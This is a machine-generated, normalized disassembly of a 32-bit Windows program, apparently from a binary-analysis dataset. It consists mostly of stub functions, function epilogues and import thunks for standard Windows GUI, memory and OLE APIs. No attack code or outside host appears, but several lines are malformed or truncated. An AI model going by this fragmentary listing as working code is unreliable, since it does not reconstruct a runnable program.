mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403afe
jmp sub_403580
sub_403b5e
jmp sub_403580
sub_403b78
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403a70
mov [ rw-data ] 0x0
call sub_403b18
retn
sub_403cb1
retn
sub_403e13
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403e18
mov [ rw-data ] eax
call sub_403d40
sub_403eac
push eax
call ExitThread
sub_4040d8
retn
sub_404114
retn
sub_404122
retn
sub_40413b
retn
sub_40414c
retn
sub_404233
retn
sub_404364
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_404380#2
jmp sub_404380
sub_4043c9
retn
j_sub_404380
jmp sub_404380
sub_4043d1
retn
sub_404413
retn
sub_40456c
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402828
sub_404584
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_4046dc
retn
sub_4046ee
retn
sub_4046f0
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_404918
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402828
call [ rw-data ]
retn
sub_404a1c
mov ecx 0x1
jmp sub_404930
sub_404a26
retn
sub_404a28
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402828
call [ rw-data ]
retn
sub_404c4e
retn
sub_404c50
mov al 0x11
jmp sub_402828
sub_404c7b
retn
sub_404c8c
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404b5c
pop ebp
retn 0x4
j_sub_404930
jmp sub_404930
sub_404ca1
retn
sub_404ca4
call sub_404e44
retn
sub_404ed0
call sub_404ea8
retn
sub_405219
jmp sub_403834
sub_405384
call sub_405394
retn
sub_40538c
call sub_4053b4
retn
sub_405394
push ebx
mov ebx eax
mov eax 0x8
call sub_4026cc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_40544f
jmp sub_403580
sub_405470
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_4054e4
jmp sub_403834
sub_4054eb
pop ecx
pop ebp
retn
sub_405564
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_405570
add eax 0x4
push eax
call sub_401304
retn
sub_40557c
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402828
sub_40558c
call sub_403090
mov [ eax + 0x4 ] 0x1
retn
sub_4055c4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call sub_4012fc
pop ebp
retn 0x4
sub_4058b3
jmp sub_403834
sub_4058ba
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405957
jmp sub_403834
sub_40595e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4059a7
jmp sub_403834
sub_4059ae
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405a72
jmp sub_403834
sub_405a79
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405aca
jmp sub_403834
sub_405ad1
pop ebp
retn
sub_405ba8
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_405bc8
push eax
push 0x40
call LocalAlloc
retn
sub_405bd4
mov eax 0x10
retn
sub_405c60
mov eax rw-data
call sub_405470
retn
sub_405cd5
jmp sub_403834
sub_405cdc
pop ebp
retn
sub_405ce0
sub [ rw-data ] 0x1
retn
sub_405ce8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_405d04
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_405d4d
jmp sub_403834
sub_405d54
pop ebp
retn
sub_405d58
sub [ rw-data ] 0x1
retn
RegOpenKeyExA
jmp [ RegOpenKeyExA@IAT ]
RegQueryValueExA
jmp [ RegQueryValueExA@IAT ]
CompareStringA
jmp [ __import_lookup_table_6(kernel32:CompareStringA) ]
CreateFileA
jmp [ CreateFileA@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
FindResourceA
jmp [ FindResourceA@IAT ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
InterlockedDecrement
jmp [ __import_lookup_table_6(kernel32:InterlockedDecrement) ]
InterlockedExchange
jmp [ __import_lookup_table_6(kernel32:InterlockedExchange) ]
InterlockedIncrement
jmp [ __import_lookup_table_6(kernel32:InterlockedIncrement) ]
FreeResource
jmp [ __import_lookup_table_6(kernel32:FreeResource) ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ __import_lookup_table_6(kernel32:GetCPInfo) ]
GetCurrentProcessId
jmp [ __import_lookup_table_6(kernel32:GetCurrentProcessId) ]
GetDateFormatA
jmp [ __import_lookup_table_6(kernel32:GetDateFormatA) ]
GetDiskFreeSpaceA
jmp [ __import_lookup_table_6(kernel32:GetDiskFreeSpaceA) ]
GetExitCodeThread
jmp [ GetExitCodeThread@IAT ]
GetFileSize
jmp [ GetFileSize@IAT ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocaleInfoA
jmp [ __import_lookup_table_6(kernel32:GetLocaleInfoA) ]
GetModuleHandleA
jmp [ __import_lookup_table_6(kernel32:GetModuleHandleA) ]
GetStringTypeExA
jmp [ __import_lookup_table_6(kernel32:GetStringTypeExA) ]
GetSystemInfo
jmp [ __import_lookup_table_6(kernel32:GetSystemInfo) ]
GetTempPathA
jmp [ __import_lookup_table_6(kernel32:GetTempPathA) ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ GlobalFindAtomA@IAT ]
GlobalFree
jmp [ GlobalFree@IAT ]
GlobalLock
jmp [ GlobalLock@IAT ]
GlobalHandle
jmp [ GlobalHandle@IAT ]
GlobalReAlloc
jmp [ GlobalReAlloc@IAT ]
GlobalUnlock
jmp [ GlobalUnlock@IAT ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadResource
jmp [ LoadResource@IAT ]
LockResource
jmp [ LockResource@IAT ]
ReadFile
jmp [ __import_lookup_table_6(kernel32:ReadFile) ]
ResetEvent
jmp [ __import_lookup_table_6(kernel32:ResetEvent) ]
ResumeThread
jmp [ __import_lookup_table_6(kernel32:ResumeThread) ]
SetEndOfFile
jmp [ __import_lookup_table_6(kernel32:SetEndOfFile) ]
SetEvent
jmp [ __import_lookup_table_6(kernel32:SetEvent) ]
SetFilePointer
jmp [ __import_lookup_table_6(kernel32:SetFilePointer) ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_406034
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
lstrcpyA
jmp [ __import_lookup_table_6(kernel32:lstrcpyA) ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoSizeA) ]
VerQueryValueA
jmp [ __import_lookup_table_7(version:VerQueryValueA) ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ __import_lookup_table_8(gdi32:CreateDIBSection) ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ __import_lookup_table_8(gdi32:CreatePenIndirect) ]
ExcludeClipRect
jmp [ __import_lookup_table_8(gdi32:ExcludeClipRect) ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetCurrentPositionEx
jmp [ GetCurrentPositionEx@IAT ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetPixel
jmp [ __import_lookup_table_8(gdi32:GetPixel) ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LineTo
jmp [ __import_lookup_table_8(gdi32:LineTo) ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ MoveToEx@IAT ]
RectVisible
jmp [ __import_lookup_table_8(gdi32:RectVisible) ]
ScaleWindowExtEx
jmp [ ScaleWindowExtEx@IAT ]
SelectClipRgn
jmp [ SelectClipRgn@IAT ]
SetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:SetBrushOrgEx) ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetPixel
jmp [ __import_lookup_table_8(gdi32:SetPixel) ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
SetWindowOrgEx
jmp [ SetWindowOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ __import_lookup_table_9(user32:ActivateKeyboardLayout) ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
CharLowerA
jmp [ CharLowerA@IAT ]
BeginDeferWindowPos
jmp [ __import_lookup_table_9(user32:BeginDeferWindowPos) ]
BeginPaint
jmp [ __import_lookup_table_9(user32:BeginPaint) ]
CallNextHookEx
jmp [ __import_lookup_table_9(user32:CallNextHookEx) ]
CallWindowProcA
jmp [ __import_lookup_table_9(user32:CallWindowProcA) ]
CharNextA
jmp [ CharNextA@IAT ]
CharToOemA
jmp [ CharToOemA@IAT ]
CheckMenuItem
jmp [ __import_lookup_table_9(user32:CheckMenuItem) ]
ClientToScreen
jmp [ __import_lookup_table_9(user32:ClientToScreen) ]
CreateIcon
jmp [ __import_lookup_table_9(user32:CreateIcon) ]
CreateMenu
jmp [ __import_lookup_table_9(user32:CreateMenu) ]
CreatePopupMenu
jmp [ __import_lookup_table_9(user32:CreatePopupMenu) ]
DefFrameProcA
jmp [ __import_lookup_table_9(user32:DefFrameProcA) ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DeferWindowPos
jmp [ DeferWindowPos@IAT ]
DestroyIcon
jmp [ __import_lookup_table_9(user32:DestroyIcon) ]
DestroyMenu
jmp [ __import_lookup_table_9(user32:DestroyMenu) ]
DestroyWindow
jmp [ __import_lookup_table_9(user32:DestroyWindow) ]
DispatchMessageA
jmp [ __import_lookup_table_9(user32:DispatchMessageA) ]
DrawFrameControl
jmp [ __import_lookup_table_9(user32:DrawFrameControl) ]
DrawIcon
jmp [ __import_lookup_table_9(user32:DrawIcon) ]
DrawIconEx
jmp [ __import_lookup_table_9(user32:DrawIconEx) ]
DrawMenuBar
jmp [ __import_lookup_table_9(user32:DrawMenuBar) ]
EnableWindow
jmp [ EnableWindow@IAT ]
EndDeferWindowPos
jmp [ EndDeferWindowPos@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
EnumThreadWindows
jmp [ __import_lookup_table_9(user32:EnumThreadWindows) ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ __import_lookup_table_9(user32:EqualRect) ]
FindWindowA
jmp [ FindWindowA@IAT ]
GetClassNameA
jmp [ __import_lookup_table_9(user32:GetClassNameA) ]
GetClientRect
jmp [ __import_lookup_table_9(user32:GetClientRect) ]
GetCursor
jmp [ __import_lookup_table_9(user32:GetCursor) ]
GetDC
jmp [ __import_lookup_table_9(user32:GetDC) ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ GetKeyNameTextA@IAT ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ __import_lookup_table_9(user32:GetKeyboardState) ]
GetLastActivePopup
jmp [ __import_lookup_table_9(user32:GetLastActivePopup) ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ __import_lookup_table_9(user32:GetMenuItemID) ]
GetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:GetMenuItemInfoA) ]
GetMenuStringA
jmp [ __import_lookup_table_9(user32:GetMenuStringA) ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ __import_lookup_table_9(user32:GetParent) ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetScrollInfo
jmp [ __import_lookup_table_9(user32:GetScrollInfo) ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ __import_lookup_table_9(user32:GetTopWindow) ]
GetWindow
jmp [ GetWindow@IAT ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ __import_lookup_table_9(user32:GetWindowPlacement) ]
GetWindowRect
jmp [ __import_lookup_table_9(user32:GetWindowRect) ]
GetWindowTextA
jmp [ __import_lookup_table_9(user32:GetWindowTextA) ]
__imp_GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
InsertMenuItemA
jmp [ __import_lookup_table_9(user32:InsertMenuItemA) ]
InvalidateRect
jmp [ InvalidateRect@IAT ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ IsWindow@IAT ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
IsZoomed
jmp [ IsZoomed@IAT ]
KillTimer
jmp [ __import_lookup_table_9(user32:KillTimer) ]
LoadBitmapA
jmp [ LoadBitmapA@IAT ]
LoadIconA
jmp [ __import_lookup_table_9(user32:LoadIconA) ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
MsgWaitForMultipleObjects
jmp [ MsgWaitForMultipleObjects@IAT ]
OemToCharA
jmp [ __import_lookup_table_9(user32:OemToCharA) ]
PeekMessageA
jmp [ PeekMessageA@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
PtInRect
jmp [ PtInRect@IAT ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ __import_lookup_table_9(user32:RemoveMenu) ]
ScrollWindow
jmp [ ScrollWindow@IAT ]
SetActiveWindow
jmp [ __import_lookup_table_9(user32:SetActiveWindow) ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ __import_lookup_table_9(user32:SetClassLongA) ]
SetForegroundWindow
jmp [ __import_lookup_table_9(user32:SetForegroundWindow) ]
SetMenuItemInfoA
jmp [ SetMenuItemInfoA@IAT ]
SetParent
jmp [ __import_lookup_table_9(user32:SetParent) ]
SetScrollInfo
jmp [ __import_lookup_table_9(user32:SetScrollInfo) ]
SetScrollRange
jmp [ __import_lookup_table_9(user32:SetScrollRange) ]
SetTimer
jmp [ __import_lookup_table_9(user32:SetTimer) ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowCursor
jmp [ __import_lookup_table_9(user32:ShowCursor) ]
ShowOwnedPopups
jmp [ ShowOwnedPopups@IAT ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_406748
call GetTickCount
retn
sub_406750
xor eax eax
retn
sub_406754
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406764
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406780
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406794
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_4067cc
call sub_40673c
retn
CreateWindowExA
jmp [ __import_lookup_table_9(user32:CreateWindowExA) ]
sub_4069a9
jmp sub_403834
sub_4069b0
pop ebp
retn
sub_4069b4
sub [ rw-data ] 0x1
retn
sub_4069e1
jmp sub_403834
sub_4069e8
pop ebp
retn
sub_4069ec
sub [ rw-data ] 0x1
retn
sub_406cf1
jmp sub_403834
sub_406cf8
pop ebp
retn
sub_406cfc
sub [ rw-data ] 0x1
retn
sub_4077ed
add eax 0xffffffd4
jmp sub_40cc18
sub_4077f5
add eax 0xffffffd4
jmp sub_40cac0
sub_4077fd
add eax 0xffffffd4
jmp sub_40cb5c
sub_40780f
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4055c4
sub_407819
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4055d8
sub_407b48
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_407b10
test eax eax
sete al
pop esi
pop ebx
retn
sub_407d29
jmp sub_403834
sub_407d30
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4081c8
call sub_4081a4
retn
sub_408260
push eax
call CloseHandle
retn
sub_4083e8
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_4083fc
push esi
mov esi eax
xchg edx eax
call sub_4028c8
mov eax esi
pop esi
retn
sub_4085bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_4040ac
pop esi
pop ebx
retn
sub_4085d0
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026cc
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_4085e4
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408684
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402828
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_4086a8
push ebx
mov ebx eax
mov eax ebx
call sub_403eb4
pop ebx
retn
sub_408a0b
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403eb4
pop eax
pop ebx
retn
sub_408ca0
int 0x8c
inc eax
add [ ecx ] ch
lea eax [ eax ]
pushad
lea eax [ eax ]
pushad
lea eax [ eax ]
0x408d
sub_408cc3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_408e1e
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_40917b
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_40917b
sub_409238
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404374
mov edx esi
xor ecx ecx
call sub_4090c4
pop esi
pop ebx
retn
sub_4092ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404374
mov edx esi
mov cl 0x1
call sub_4090c4
pop esi
pop ebx
retn
sub_409926
jmp sub_403834
sub_40992d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409a1e
jmp sub_403834
sub_409a25
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a1c9
jmp sub_403834
sub_40a1d0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a258
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a1fc
pop ebp
retn 0x8
sub_40a39d
jmp sub_403834
sub_40a3a4
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40a847
jmp sub_403834
sub_40a84e
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ad33
jmp sub_403834
sub_40ad3a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ade5
jmp sub_403834
sub_40adec
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40ae8f
jmp sub_403834
sub_40ae96
pop esi
pop ecx
pop ebp
retn
sub_40b072
jmp sub_403834
sub_40b079
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b0d0
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b3c2
jmp sub_403834
sub_40b490
jmp sub_403834
sub_40b4b8
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_4030ac
sub_40b5b4
pop ebx
retn
sub_40b654
jmp sub_403834
sub_40b65b
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b664
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_40386c
sub_40b671
retn
sub_40b674
push ebp
mov ebp esp
call sub_40b5b8
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40b664
pop ebp
retn 0x4
sub_40b690
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
retn
sub_40b728
push ebx
mov ebx eax
mov eax ebx
call sub_40b6a8
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40b8fb
jmp sub_403834
sub_40b902
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b9c7
jmp sub_403834
sub_40b9ce
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40b9d8
call sub_40b264
mov eax 0x1
call sub_403e18
sub_40bb5c
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40bc35
jmp sub_403834
sub_40bc52
jmp sub_403834
sub_40bc59
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40bd04
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40bc68
mov ecx eax
sub_40bef0
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40bf10
push eax
call CharNextA
retn
sub_40c1a8
jmp sub_403834
sub_40c1af
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c218
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40c66f
jmp sub_403834
sub_40c676
pop ebx
mov esp ebp
pop ebp
retn
Sleep
jmp [ Sleep@IAT ]
sub_40c7b4
jmp sub_403834
sub_40c7bb
pop ebx
mov esp ebp
pop ebp
retn
sub_40c7c0
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40c724
sub_40c7d0
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40c7ec
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4026ec
pop ebx
retn
sub_40c874
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40c880
xchg [ eax ] edx
mov eax edx
retn
sub_40c8e0
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40c970
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40ca88
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40cab0
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40cd2b
jmp sub_403834
sub_40cd32
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40cda0
jmp sub_403834
sub_40cda7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cdc5
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40cdbe
jmp sub_403834
sub_40cdc5
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d288
jmp sub_403834
sub_40d28f
pop ebp
retn
VariantInit
jmp [ __import_lookup_table_11(oleaut32:VariantInit) ]
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40d308
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40d36e
jmp sub_403834
sub_40d375
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d3da
jmp sub_403834
sub_40d3e1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d446
jmp sub_403834
sub_40d44d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d4b2
jmp sub_403834
sub_40d4b9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d51e
jmp sub_403834
sub_40d525
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d59d
jmp sub_403834
sub_40d5a4
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40d610
jmp sub_403834
sub_40d617
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40d680
jmp sub_403834
sub_40d687
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40d6f4
jmp sub_403834
sub_40d6fb
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ __import_lookup_table_11(oleaut32:SafeArrayCreate) ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
sub_40da81
jmp sub_403834
sub_40da88
pop ebp
retn
sub_40da8c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40d750
sub_40da9d
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e0be
jmp sub_403834
sub_40e0c5
pop ecx
pop ebp
retn
sub_40e157
jmp sub_403834
sub_40e15e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e1ae
jmp sub_403834
sub_40e1b5
pop ecx
pop ebp
retn
sub_40e247
jmp sub_403834
sub_40e24e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e29e
jmp sub_403834
sub_40e2a5
pop ecx
pop ebp
retn
sub_40e4ed
jmp sub_403834
sub_40e4f4
pop ebx
mov esp ebp
pop ebp
retn
sub_40e586
jmp sub_403834
sub_40e58d
pop ecx
pop ebp
retn
sub_40e590
push ebx
mov ebx eax
mov eax ebx
call sub_40e828
mov [ ebx ] 0x1
pop ebx
retn
sub_40e828
test [ eax ] 0xbfe8
jne r-xdata
call sub_40e7ac
retn
mov [ eax ] 0x0
retn
sub_40e83c
push eax
call sub_40e828
pop eax
retn
sub_40ea9c
call sub_40eb50
retn
sub_40ecba
jmp sub_403834
sub_40ecc1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ed65
jmp sub_403834
sub_40ed6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ed8e
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4045ac
retn
sub_40ed87
jmp sub_403834
sub_40ed8e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
